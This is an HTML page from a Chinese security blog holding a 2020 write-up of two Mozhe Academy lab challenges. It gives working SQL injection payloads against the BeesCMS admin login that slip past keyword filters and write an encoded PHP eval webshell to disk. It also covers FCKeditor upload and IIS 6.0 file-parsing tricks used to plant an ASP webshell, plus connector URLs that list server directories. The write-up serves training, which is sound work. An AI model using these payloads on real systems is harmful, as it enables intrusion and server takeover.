@@ -1,0 +1,1238 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>墨者学院题目writeup - 明月归的小站</title>
+  
+    <meta name="keywords" content="writeup,墨者学院">
+  
+
+  
+    <meta name="description" content="最近360众测很火，听说好多这上面的题，抽空做做！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">墨者学院题目writeup</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/">
+      墨者学院题目writeup
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年4月13日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>最近360众测很火，听说好多这上面的题，抽空做做！</p>
+<a id="more"></a>
+
+<h2 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h2><h3 id="CMS漏洞"><a href="#CMS漏洞" class="headerlink" title="CMS漏洞"></a>CMS漏洞</h3><h4 id="BeesCMS系统漏洞分析溯源"><a href="#BeesCMS系统漏洞分析溯源" class="headerlink" title="BeesCMS系统漏洞分析溯源"></a>BeesCMS系统漏洞分析溯源</h4><p>御剑扫目录：</p>
+<img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIM截图20200413211443.png" style="zoom: 80%;">
+
+<p>发现后台<code>/admin/login.php</code>，此处存在sql注入</p>
+<p>详细分析参见：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11423384.html">https://www.cnblogs.com/yuzly/p/11423384.html</a></p>
+<p>此处验证码存在漏洞，即一个验证码可多次使用，我们在username处加上一个<code>&#39;</code>发现</p>
+<img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIM截图20200413211954.png" style="zoom:80%;">
+
+<p>sql语句也出来了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>,admin_name,admin_password,admin_purview,is_disable <span class="keyword">from</span> bees_admin <span class="keyword">where</span> admin_name=<span class="string">&#x27;dsad&#x27;&#x27; limit 0,1</span></span><br></pre></td></tr></table></figure>
+
+<p>漏洞分析可知，union, and,select被替换，可以这样绕过：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union =&gt; uni union on</span><br><span class="line">select =&gt; selselectect</span><br><span class="line"><span class="keyword">and</span> =&gt; a <span class="keyword">and</span> nd</span><br></pre></td></tr></table></figure>
+
+<p>user输入,发现成功报错注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin &#x27; a and nd extractvalue(1,concat(1,database()))%23</span><br></pre></td></tr></table></figure>
+
+<p>试着写shell，这里有htmlspecialchars函数的过滤，16进制或者char函数绕过，url编码好像绕过不了，还有对into ,outfile的过滤，可以这样绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">outfile =&gt; outoutfilefile</span><br><span class="line">into =&gt; in into</span><br></pre></td></tr></table></figure>
+
+<p>最终构造payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; uni union on selselectect 1,2,3,4,0x3c3f70687020406576616c28245f504f53545b315d293b3f3e  in into  outoutfilefile %27/var/www/html/moonback.php%27%23</span></span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; uni union on selselectect null,null,null,null,CHAR(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 49, 93, 41, 59, 63, 62)  in into  outoutfilefile %27/var/www/html/mb.php%27%23</span></span><br></pre></td></tr></table></figure>
+
+<p>密码为1，蚁剑连在<code>/key.txt</code>发现key</p>
+<img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIM截图20200413215317.png" style="zoom:80%;">
+
+
+
+<h3 id="编辑器漏洞"><a href="#编辑器漏洞" class="headerlink" title="编辑器漏洞"></a>编辑器漏洞</h3><h4 id="编辑器漏洞分析溯源-第1题"><a href="#编辑器漏洞分析溯源-第1题" class="headerlink" title="编辑器漏洞分析溯源(第1题)"></a>编辑器漏洞分析溯源(第1题)</h4><p>参考:<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/116338.html">https://www.secpulse.com/archives/116338.html</a></p>
+<p>访问靶场，提示编辑器在<code>/fckeditor/</code>目录</p>
+<p>查看一下编辑器版本信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/fckeditor/editor/dialog/fck_about.html</span><br><span class="line">/FCKeditor/_whatsnew.html</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIM截图20200413221018.png" style="zoom: 67%;">
+
+<p>测试上传点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/test.html</span><br><span class="line">FCKeditor/editor/filemanager/upload/test.html</span><br><span class="line">FCKeditor/editor/filemanager/connectors/test.html</span><br><span class="line">FCKeditor/editor/filemanager/connectors/uploadtest.html</span><br><span class="line"></span><br><span class="line">FCKeditor/_samples/<span class="keyword">default</span>.html</span><br><span class="line">FCKeditor/_samples/asp/sample01.asp</span><br><span class="line">FCKeditor/_samples/asp/sample02.asp</span><br><span class="line">FCKeditor/_samples/asp/sample03.asp</span><br><span class="line">FCKeditor/_samples/asp/sample04.asp</span><br><span class="line">FCKeditor/_samples/<span class="keyword">default</span>.html</span><br><span class="line">FCKeditor/editor/fckeditor.htm</span><br><span class="line">FCKeditor/editor/fckdialog.html</span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=http:<span class="comment">//www.site.com/fckeditor/editor/filemanager/connectors/php/connector.php</span></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=http:<span class="comment">//www.site.com/fckeditor/editor/filemanager/connectors/asp/connector.asp</span></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=http:<span class="comment">//www.site.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspx</span></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=http:<span class="comment">//www.site.com/fckeditor/editor/filemanager/connectors/jsp/connector.jsp</span></span><br><span class="line"></span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</span><br><span class="line">FCKeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jsp</span><br><span class="line">fckeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=connectors/aspx/connector.Aspx</span><br><span class="line">fckeditor/editor/filemanager/browser/<span class="keyword">default</span>/browser.html?Type=Image&amp;Connector=connectors/php/connector.php</span><br></pre></td></tr></table></figure>
+
+<p>随便输一个不存在的路径发现是IIS的报错页面，在</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;test.html</span><br></pre></td></tr></table></figure>
+
+<p>发现可以上传</p>
+<img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIM截图20200413224820.png" style="zoom:67%;">
+
+<p>在http 响应头里看到有<code>Microsoft-IIS/6.0</code>，绕过方法很多，这里不需要绕过好像</p>
+<p><strong>1. 二次上传绕过</strong></p>
+<p>文件名‘ . ’ 修改为‘ _ ’</p>
+<p>FCK在上传了诸如<code>shell.asp;.jpg</code>的文件后，会自动将文件名改为<code>shell_asp;.jpg</code>。可以继续上传同名文件，文件名会变为<code>shell.asp;(1).jpg</code></p>
+<p><strong>2. 提交shell.php+空格绕过</strong></p>
+<p>提交<code>shell.php</code>+空格绕过</p>
+<p>空格只支持windows系统，linux系统是不支持的，可提交<code>shell.php</code>+空格来绕过文件名限制。</p>
+<p><strong>3. iis6.0突破文件夹限制</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Fckeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;Type&#x3D;File&amp;CurrentFolder&#x3D;&#x2F;shell.asp&amp;NewFolderName&#x3D;z.asp</span><br><span class="line"></span><br><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;shell.asp&amp;NewFolderName&#x3D;z&amp;uuid&#x3D;1244789975684</span><br><span class="line"></span><br><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;CreateFolder&amp;CurrentFolder&#x3D;&#x2F;&amp;Type&#x3D;Image&amp;NewFolderName&#x3D;shell.asp</span><br></pre></td></tr></table></figure>
+
+<p><strong>4. 文件解析限制</strong></p>
+<p>通过Fckeditor编辑器在文件上传页面中，创建诸如1.asp文件夹，然后再到该文件夹下上传一个图片的webshell文件，获取其shell。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.moonback.xyz&#x2F;images&#x2F;upload&#x2F;201806&#x2F;image&#x2F;1.asp&#x2F;1.jpg</span><br></pre></td></tr></table></figure>
+
+<p>关于解析漏洞参考：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/3750.html">https://www.secpulse.com/archives/3750.html</a></p>
+<p>最终上传类似<code>shell.asp;jpg</code>就能上传成功，成功之后会把目录文件列举出来,地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;userfiles&#x2F;file&#x2F;shell.asp;jpg</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连找flag就行</p>
+<img src="/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/TIM截图20200413224623.png" style="zoom:67%;">
+
+<p>如果找不到目录的话可以试试</p>
+<p><strong>1. 根据xml返回信息查看网站目录</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.-sec.org&#x2F;fckeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;CreateFolder&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;..&#x2F;..&#x2F;..&#x2F;&amp;NewFolderName&#x3D;shell.asp</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 获取当前文件夹</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;</span><br><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;php&#x2F;connector.php?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;</span><br><span class="line">FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;asp&#x2F;connector.asp?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;CurrentFolder&#x3D;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 游览c盘</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;FCKeditor&#x2F;editor&#x2F;filemanager&#x2F;browser&#x2F;default&#x2F;connectors&#x2F;aspx&#x2F;connector.aspx?Command&#x3D;GetFoldersAndFiles&amp;Type&#x3D;Image&amp;Curre</span><br></pre></td></tr></table></figure>
+
+<p>11</p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.m00nback.xyz/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/>http://www.m00nback.xyz/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-26T18:23:41+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2020年4月26日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/writeup/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>writeup</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>墨者学院</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/&title=墨者学院题目writeup - 明月归的小站&summary=最近360众测很火，听说好多这上面的题，抽空做做！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/&title=墨者学院题目writeup - 明月归的小站&summary=最近360众测很火，听说好多这上面的题，抽空做做！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2020/04/13/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2%E9%A2%98%E7%9B%AEwriteup/&title=墨者学院题目writeup - 明月归的小站&summary=最近360众测很火，听说好多这上面的题，抽空做做！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/04/18/NPUCTF-writeup/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>NPUCTF writeup</p>
+                <p class='content'>记一下writeup!    wtcl!
+
+
+web查源码查源码得到flag
+RealEzPHP在
+1/time.php?source
+
+看到源码
+12345678910111213141516...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/04/11/MRCTF2020-writeup/'>
+                <p class='title'>MRCTF2020 writeup<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>本篇博客主要介绍了MRCTF 2020部分题目的writeup!
+
+
+webEz_bypass查看源代码
+12345678910111213141516171819202122232425262...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E5%AE%89%E5%85%A8"><span class="toc-text">Web安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CMS%E6%BC%8F%E6%B4%9E"><span class="toc-text">CMS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#BeesCMS%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90"><span class="toc-text">BeesCMS系统漏洞分析溯源</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">编辑器漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90-%E7%AC%AC1%E9%A2%98"><span class="toc-text">编辑器漏洞分析溯源(第1题)</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
